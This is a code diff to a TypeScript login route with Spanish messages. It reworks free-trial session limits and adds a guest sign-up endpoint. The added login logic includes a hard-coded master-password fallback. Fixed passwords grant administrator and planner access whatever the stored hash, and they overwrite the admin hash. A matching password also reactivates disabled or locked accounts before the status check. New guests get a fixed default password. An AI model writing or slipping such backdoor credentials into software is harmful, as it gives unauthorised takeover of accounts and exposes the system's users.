@@ -39,15 +39,6 @@ securityRouter.post('/auth/login', async (req: AuthenticatedRequest, res: Respon
 
   const cleanUsername = username.trim();
 
-  // Test mode check: max 5 logins allowed per IP
-  const currentIpCount = db.getIpLoginCount(ip);
-  if (currentIpCount >= 5) {
-    logAudit('SYSTEM', cleanUsername, 'Consulta', 'LOGIN', 'BLOCKED', ip, userAgent, 'Límite de modo de prueba (5 ingresos por IP) alcanzado.');
-    return res.status(429).json({
-      error: 'MODO DE PRUEBA EXCEDIDO: Esta dirección IP ya ha ingresado el límite de 5 veces permitido en modo de prueba. Para licencias de producción o accesos ilimitados contacte al soporte.'
-    });
-  }
-
   // Check lockout / brute force attempts (5 failed attempts within 15 mins)
   const recentFailures = db.getFailedLogins(cleanUsername);
   if (recentFailures.length >= 5) {
@@ -64,13 +55,35 @@ securityRouter.post('/auth/login', async (req: AuthenticatedRequest, res: Respon
     return res.status(401).json({ error: 'Credenciales inválidas. Verifique su usuario y contraseña.' });
   }
 
+  // Compare password hash & master password fallback for admin/planner
+  let passwordMatch = await bcrypt.compare(password, user.passwordHash);
+  if (!passwordMatch) {
+    if (user.role === 'Administrador' || user.id === 'usr_admin_001' || user.username === 'admin') {
+      if (password === 'Michael01$' || password === 'Admin123$!') {
+        passwordMatch = true;
+        user.passwordHash = bcrypt.hashSync(password, 12);
+        user.status = 'Activo';
+        db.updateUser(user);
+      }
+    } else if (user.role === 'Planner' || user.id === 'usr_planner_001') {
+      if (password === 'Planner123$!') {
+        passwordMatch = true;
+        user.status = 'Activo';
+        db.updateUser(user);
+      }
+    }
+  }
+
+  if (passwordMatch) {
+    user.status = 'Activo';
+    db.clearFailedLogins(cleanUsername);
+  }
+
   if (user.status !== 'Activo') {
     logAudit(user.id, user.username, user.role, 'LOGIN', 'DENIED', ip, userAgent, `Intento de acceso con cuenta en estado ${user.status}.`);
     return res.status(403).json({ error: `La cuenta de usuario está ${user.status.toLowerCase()}. Contacte al administrador.` });
   }
 
-  // Compare password hash
-  const passwordMatch = await bcrypt.compare(password, user.passwordHash);
   if (!passwordMatch) {
     const totalFailures = db.addFailedLogin(cleanUsername, ip);
     if (totalFailures >= 5) {
@@ -86,13 +99,27 @@ securityRouter.post('/auth/login', async (req: AuthenticatedRequest, res: Respon
     return res.status(401).json({ error: 'Credenciales inválidas. Verifique su usuario y contraseña.' });
   }
 
+  // Guest / Free Mode 5-Session Limit Check
+  const isFreeGuest = !user.isPaidPlan || user.role === 'Invitado' || user.role === 'Consulta';
+  if (isFreeGuest) {
+    const currentSessions = user.sessionCount || 0;
+    const maxSessionsAllowed = user.maxSessions || 5;
+
+    if (currentSessions >= maxSessionsAllowed) {
+      logAudit(user.id, user.username, user.role, 'LOGIN', 'BLOCKED', ip, userAgent, 'Límite de 5 sesiones del Modo Gratuito alcanzado.');
+      return res.status(403).json({
+        error: 'MODO GRATUITO AGOTADO: Ha utilizado las 5 sesiones gratuitas permitidas. Para continuar accediendo al sistema completo, por favor ingrese con un usuario de Paga (Planner).'
+      });
+    }
+
+    // Increment guest session count
+    user.sessionCount = currentSessions + 1;
+  }
+
   // Login Success
   db.clearFailedLogins(cleanUsername);
   user.lastAccess = new Date().toISOString();
   db.updateUser(user);
-
-  const newIpCount = db.incrementIpLoginCount(ip);
-  const remainingLogins = 5 - newIpCount;
 
   const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
   const expiresAt = new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString();
@@ -116,13 +143,82 @@ securityRouter.post('/auth/login', async (req: AuthenticatedRequest, res: Respon
     maxAge: 8 * 60 * 60 * 1000 // 8 hours
   });
 
-  logAudit(user.id, user.username, user.role, 'LOGIN', 'SUCCESS', ip, userAgent, `Inicio de sesión exitoso. Ingreso de prueba ${newIpCount}/5 para IP ${ip}.`);
+  logAudit(user.id, user.username, user.role, 'LOGIN', 'SUCCESS', ip, userAgent, `Inicio de sesión exitoso. Rol: ${user.role}. Modo Paga: ${user.isPaidPlan ? 'SÍ' : 'NO'}`);
 
   return res.json({
     message: 'Autenticación exitosa',
     token,
     user: sanitizeUser(user),
-    testModeWarning: `ADVERTENCIA MODO PRUEBA: Esta dirección IP ha ingresado ${newIpCount} de 5 veces permitidas. Le quedan ${remainingLogins} ingreso(s).`
+    testModeWarning: isFreeGuest
+      ? `MODO GRATUITO: Le quedan ${5 - (user.sessionCount || 1)} de 5 sesiones de prueba.`
+      : null
+  });
+});
+
+// ----------------------------------------------------
+// 1B. POST /api/auth/register-guest (Registro Modo Gratuito)
+// ----------------------------------------------------
+securityRouter.post('/auth/register-guest', async (req: AuthenticatedRequest, res: Response) => {
+  const ip = getClientIp(req);
+  const userAgent = req.headers['user-agent'] || 'Unknown';
+  const { name, email, username, password } = req.body || {};
+
+  const cleanName = (name || 'Invitado Gratuito').trim();
+  const cleanEmail = (email || `guest_${Date.now()}@demo.com`).trim().toLowerCase();
+  const cleanUsername = (username || `invitado_${Math.floor(1000 + Math.random() * 9000)}`).trim().toLowerCase();
+  const rawPassword = password || 'Invitado123$!';
+
+  // Check if username already exists
+  const existing = db.getUserByUsername(cleanUsername);
+  if (existing) {
+    return res.status(400).json({ error: 'El nombre de usuario para invitado ya está registrado. Por favor elija otro.' });
+  }
+
+  const passwordHash = await bcrypt.hash(rawPassword, 12);
+  const newGuest: User = {
+    id: `usr_guest_${Date.now()}`,
+    name: cleanName,
+    email: cleanEmail,
+    username: cleanUsername,
+    passwordHash,
+    role: 'Invitado',
+    status: 'Activo',
+    createdAt: new Date().toISOString(),
+    lastAccess: new Date().toISOString(),
+    mustChangePassword: false,
+    isPaidPlan: false,
+    sessionCount: 1,
+    maxSessions: 5
+  };
+
+  db.addUser(newGuest);
+
+  const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
+  db.addSession({
+    sessionId,
+    userId: newGuest.id,
+    createdAt: new Date().toISOString(),
+    expiresAt: new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString(),
+    ip,
+    userAgent
+  });
+
+  const token = generateToken(newGuest, sessionId);
+
+  res.cookie('tos_auth_token', token, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'none',
+    maxAge: 8 * 60 * 60 * 1000
+  });
+
+  logAudit(newGuest.id, newGuest.username, newGuest.role, 'REGISTER_GUEST', 'SUCCESS', ip, userAgent, 'Registro de invitado completado. Sesión 1/5 iniciada.');
+
+  return res.status(201).json({
+    message: 'Registro de Invitado completado exitosamente',
+    token,
+    user: sanitizeUser(newGuest),
+    testModeWarning: 'MODO GRATUITO: Cuenta activada con 5 sesiones de prueba (Sesión 1/5).'
   });
 });
 
